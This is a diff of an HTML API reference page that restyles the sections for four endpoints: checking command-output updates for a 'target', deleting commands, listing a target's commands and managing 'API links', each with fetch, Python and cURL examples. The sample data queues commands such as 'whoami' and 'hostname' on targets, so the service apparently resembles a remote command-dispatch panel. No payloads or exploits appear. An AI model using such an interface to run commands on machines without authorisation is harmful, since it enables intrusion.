-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> Success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "message": "Commands checked successfully", "updated_commands": [["user123", "cmd123"],["Linux hostname", "cmd124"]] }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="view_check_update-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_check_update-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_check_update-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Check for updated command outputs from a target.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="view_check_update" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="view_check_update" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="view_check_update" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="view_check_update-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="view_check_update-js">Copy</button>
+          <div data-code="js" id="view_check_update-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('/check_command_update/demo_target', {credentials:'include'}).then(r=>r.json()).then(console.log);</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>session.get('http://SERVER/check_command_update/demo_target').json()</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -b cookies.txt "http://SERVER/check_command_update/demo_target"</code></pre></div>
         </div>
-        <pre id="view_check_update-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch)
-fetch('/check_command_update/demo_target', {credentials:'include'})
-.then(r=>r.json()).then(d=>console.log('Updated:',d.updated_commands)).catch(e=>console.error(e));</pre>
-        <pre id="view_check_update-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests) with session
-try:
-    r = session.get('http://SERVER/check_command_update/demo_target')
-    print("Updated commands:", r.json().get('updated_commands'))
-except Exception as e: print(e)</pre>
-        <pre id="view_check_update-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -b cookies.txt "http://SERVER/check_command_update/demo_target"</pre>
       </section>
 
-      <!-- 10. /api_command/delete -->
-      <section id="view_delete_command" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">POST</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api_command/delete</h2>
+      <!-- 10. POST /api_command/delete -->
+      <section id="view_delete_command" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">POST</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api_command/delete</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Delete a command from the system. Note that while the route suggests DELETE method, the implementation expects POST.</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> Requires valid session authentication.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Request Body (JSON)</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
-            <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">target_name</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Target associated with the command</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">id</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">ID of the command to delete</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> Success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "message": "Command deleted successfully" }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="view_delete_command-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_delete_command-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_delete_command-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Delete a command from the system.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="view_delete_command" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="view_delete_command" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="view_delete_command" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="view_delete_command-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="view_delete_command-js">Copy</button>
+          <div data-code="js" id="view_delete_command-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('/api_command/delete', {
+  method:'POST',
+  headers:{'Content-Type':'application/json'},
+  credentials:'include',
+  body:JSON.stringify({target_name:'demo_target', id:'cmd123'})
+}).then(r=>r.json()).then(console.log);</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>session.post('http://SERVER/api_command/delete', json={'target_name':'demo_target','id':'cmd123'}).json()</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -b cookies.txt -X POST "http://SERVER/api_command/delete" -H "Content-Type: application/json" -d '{"target_name":"demo_target","id":"cmd123"}'</code></pre></div>
         </div>
-        <pre id="view_delete_command-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch)
-fetch('/api_command/delete', {method:'POST', headers:{'Content-Type':'application/json'}, credentials:'include', body:JSON.stringify({target_name:'demo_target', id:'cmd123'})})
-.then(r=>r.json()).then(d=>console.log('Server:',d)).catch(e=>console.error(e));</pre>
-        <pre id="view_delete_command-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests) with session
-try:
-    r = session.post('http://SERVER/api_command/delete', json={'target_name':'demo_target','id':'cmd123'})
-    print(r.json())
-except Exception as e: print(e)</pre>
-        <pre id="view_delete_command-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -b cookies.txt -X POST "http://SERVER/api_command/delete" -H "Content-Type: application/json" -d '{"target_name":"demo_target","id":"cmd123"}'</pre>
       </section>
 
-      <!-- 11. /api_command/api/<targetName> -->
-      <section id="view_api_command_api" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">GET</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api_command/api/&lt;targetName&gt;</h2>
+      <!-- 11. GET /api_command/api/<targetName> -->
+      <section id="view_api_command_api" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">GET</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api_command/api/&lt;targetName&gt;</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Retrieve all commands for a target in API format. Used by the web interface to display commands.</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> Requires valid session authentication.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> Success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "allCommand": [["ID","email","target_name","command","condition","update"],["cmd123","admin@example.com","demo_target","whoami","linux","2023-08-11 12:00:00"]] }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="view_api_command_api-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_api_command_api-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_api_command_api-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Retrieve all commands for a target in API format.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="view_api_command_api" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="view_api_command_api" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="view_api_command_api" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="view_api_command_api-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="view_api_command_api-js">Copy</button>
+          <div data-code="js" id="view_api_command_api-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('/api_command/api/demo_target', {credentials:'include'}).then(r=>r.json()).then(console.log);</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>session.get('http://SERVER/api_command/api/demo_target').json()</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -b cookies.txt "http://SERVER/api_command/api/demo_target"</code></pre></div>
         </div>
-        <pre id="view_api_command_api-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch)
-fetch('/api_command/api/demo_target', {credentials:'include'})
-.then(r=>r.json()).then(d=>console.log('Commands:',d.allCommand)).catch(e=>console.error(e));</pre>
-        <pre id="view_api_command_api-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests) with session
-try:
-    r = session.get('http://SERVER/api_command/api/demo_target')
-    print("Commands:", r.json().get('allCommand'))
-except Exception as e: print(e)</pre>
-        <pre id="view_api_command_api-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -b cookies.txt "http://SERVER/api_command/api/demo_target"</pre>
       </section>
 
-      <!-- 12. /api_link -->
-      <section id="view_api_link" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">GET/POST</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api_link</h2>
+      <!-- 12. GET|POST /api_link -->
+      <section id="view_api_link" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">GET/POST</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api_link</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Manage API links. GET requests render the web interface, while POST requests create new API links.</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> Requires valid session authentication. POST expects form data.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Parameters (POST Form)</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
-            <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">target_name</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">Target associated with the API link</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">link</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">URL or endpoint for the API link</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">action_type</td><td class="p-4">string</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">HTTP method (GET, POST, etc.)</td></tr>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">condition</td><td class="p-4">integer</td><td class="p-4"></td><td class="p-4">Condition for the link (optional)</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="view_api_link-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_api_link-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_api_link-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Manage API links. POST creates new API link (form data).</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="view_api_link" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="view_api_link" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="view_api_link" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="view_api_link-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="view_api_link-js">Copy</button>
+          <div data-code="js" id="view_api_link-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>const fd = new FormData();
+fd.append('target_name','demo_target');
+fd.append('link','http://example.com/api');
+fd.append('action_type','GET');
+fetch('/api_link', {method:'POST', credentials:'include', body:fd});</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>session.post('http://SERVER/api_link', data={'target_name':'demo_target','link':'http://example.com/api','action_type':'GET'})</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -b cookies.txt -X POST "http://SERVER/api_link" -F "target_name=demo_target" -F "link=http://example.com/api" -F "action_type=GET"</code></pre></div>
         </div>
-        <pre id="view_api_link-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch) - Form POST
-const fd = new FormData();
-fd.append('target_name','demo_target'); fd.append('link','http://example.com/api'); fd.append('action_type','GET'); fd.append('condition','1');
-fetch('/api_link', {method:'POST', credentials:'include', body:fd})
-.then(()=>console.log('API link created')).catch(e=>console.error(e));</pre>
-        <pre id="view_api_link-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests) with session
-form = {'target_name':'demo_target','link':'http://example.com/api','action_type':'GET','condition':'1'}
-try:
-    r = session.post('http://SERVER/api_link', data=form)
-    print("API link created")
-except Exception as e: print(e)</pre>
-        <pre id="view_api_link-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -b cookies.txt -X POST "http://SERVER/api_link" -F "target_name=demo_target" -F "link=http://example.com/api" -F "action_type=GET" -F "condition=1"</pre>
       </section>
 
-      <!-- 13. /api_link_delete/<ID> -->
-      <section id="view_api_link_delete" class="p-6 md:p-8 bg-gradient-to-br from-white/5 to-white/2 rounded-xl border border-white/10 shadow-lg backdrop-blur-md relative animate-[fadeInUp_0.6s_ease-out] before:absolute before:top-0 before:left-0 before:right-0 before:h-0.5 before:bg-gradient-to-r before:from-[#7bd389] before:to-[#5ac768] before:opacity-70">
-        <div class="flex flex-wrap items-center gap-4 mb-4">
-          <span class="bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] px-3 py-1.5 rounded-full text-xs font-bold uppercase tracking-wide shadow-[0_4px_12px_rgba(123,211,137,0.3)]">GET</span>
-          <h2 class="font-mono text-lg sm:text-xl text-white bg-black/30 px-4 py-2 rounded-lg border border-white/10 break-words max-w-full">/api_link_delete/&lt;ID&gt;</h2>
+      <!-- 13. GET /api_link_delete/<ID> -->
+      <section id="view_api_link_delete" class="rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-700 p-6 shadow-sm scroll-mt-24">
+        <div class="flex flex-wrap items-center gap-3 mb-4">
+          <span class="px-3 py-1 rounded-full text-xs font-bold bg-indigo-100 text-indigo-700 dark:bg-indigo-900/50 dark:text-indigo-300">GET</span>
+          <code class="text-lg font-mono text-slate-800 dark:text-slate-200 break-all">/api_link_delete/&lt;ID&gt;</code>
         </div>
-        <div class="endpoint-summary mb-5">
-          <p class="mb-3">Delete an API link by its ID.</p>
-          <p class="text-sm p-3 bg-black/20 border-l-4 border-[#7bd389] rounded text-[#8b9bb5] break-words"><strong>Note:</strong> Requires valid session authentication.</p>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Parameters</h3>
-        <div class="overflow-x-auto">
-          <table class="w-full text-sm border-collapse bg-black/20 rounded-lg shadow-md">
-            <thead><tr class="border-b border-white/10 bg-gradient-to-r from-[#7bd389]/10 to-[#7bd389]/5"><th class="p-4">Name</th><th class="p-4">Type</th><th class="p-4">Location</th><th class="p-4">Required</th><th class="p-4">Description</th></tr></thead>
-            <tbody>
-              <tr class="border-b border-white/5 hover:bg-[#7bd389]/5"><td class="p-4">ID</td><td class="p-4">string</td><td class="p-4">path</td><td class="p-4"><span class="text-[#ff6b6b] font-bold">*</span></td><td class="p-4">ID of the API link to delete</td></tr>
-            </tbody>
-          </table>
-        </div>
-        <h3 class="text-lg font-semibold text-white mt-6 mb-3">Responses</h3>
-        <div class="grid md:grid-cols-2 gap-4 mb-4">
-          <div><p class="text-sm p-2 bg-[#7bd389]/20 text-[#7bd389] border border-[#7bd389]/30 rounded inline-block break-words"><span class="bg-[#7bd389]/30 px-2 py-0.5 rounded mr-2">200</span> Success</p><pre class="code mt-2 p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">{ "message": "API link deleted successfully" }</pre></div>
-        </div>
-        <div class="code-toolbar flex flex-wrap justify-between items-center gap-4 mt-5">
-          <div class="tabs flex gap-1 bg-black/30 p-1 rounded-lg border border-white/10">
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition active bg-gradient-to-r from-[#7bd389] to-[#5ac768] text-[#0b0f19] shadow-md" data-target="view_api_link_delete-js">JavaScript</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_api_link_delete-py">Python</button>
-            <button class="tab-btn px-4 py-2 rounded text-xs font-medium text-[#8b9bb5] hover:bg-white/5 hover:text-white transition" data-target="view_api_link_delete-curl">cURL</button>
+        <p class="text-slate-600 dark:text-slate-300 mb-4">Delete an API link by its ID.</p>
+        <div class="mt-4">
+          <div class="flex gap-2 mb-2">
+            <button data-tab="js" data-parent="view_api_link_delete" class="tab-btn-api px-3 py-1 text-sm rounded bg-indigo-600 text-white">JavaScript</button>
+            <button data-tab="py" data-parent="view_api_link_delete" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">Python</button>
+            <button data-tab="curl" data-parent="view_api_link_delete" class="tab-btn-api px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300">cURL</button>
+            <button data-copy-target="view_api_link_delete-js" class="copy-btn-api ml-auto px-3 py-1 text-sm rounded bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 transition">Copy</button>
           </div>
-          <button class="copy-btn flex items-center gap-2 px-4 py-2 bg-[#7bd389]/10 border border-[#7bd389]/30 rounded-lg text-[#7bd389] text-xs font-medium hover:bg-[#7bd389]/20 hover:-translate-y-0.5 hover:shadow-lg transition" data-copy-target="view_api_link_delete-js">Copy</button>
+          <div data-code="js" id="view_api_link_delete-js" class="code-block-api"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>fetch('/api_link_delete/link123', {credentials:'include'}).then(r=>r.json()).then(console.log);</code></pre></div>
+          <div data-code="py" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>session.get('http://SERVER/api_link_delete/link123').json()</code></pre></div>
+          <div data-code="curl" class="code-block-api hidden"><pre class="bg-slate-900 text-slate-100 p-4 rounded-lg overflow-x-auto text-sm"><code>curl -b cookies.txt "http://SERVER/api_link_delete/link123"</code></pre></div>
         </div>
-        <pre id="view_api_link_delete-js" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto">// JavaScript (fetch)
-fetch('/api_link_delete/link123', {credentials:'include'})
-.then(r=>r.json()).then(d=>console.log('Server:',d)).catch(e=>console.error(e));</pre>
-        <pre id="view_api_link_delete-py" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># Python (requests) with session
-try:
-    r = session.get('http://SERVER/api_link_delete/link123')
-    print(r.json())
-except Exception as e: print(e)</pre>
-        <pre id="view_api_link_delete-curl" class="code p-4 bg-[#0a101a] rounded-lg border border-white/10 font-mono text-sm text-[#dbeef4] shadow-inner overflow-x-auto hidden"># cURL
-curl -b cookies.txt "http://SERVER/api_link_delete/link123"</pre>
       </section>
 
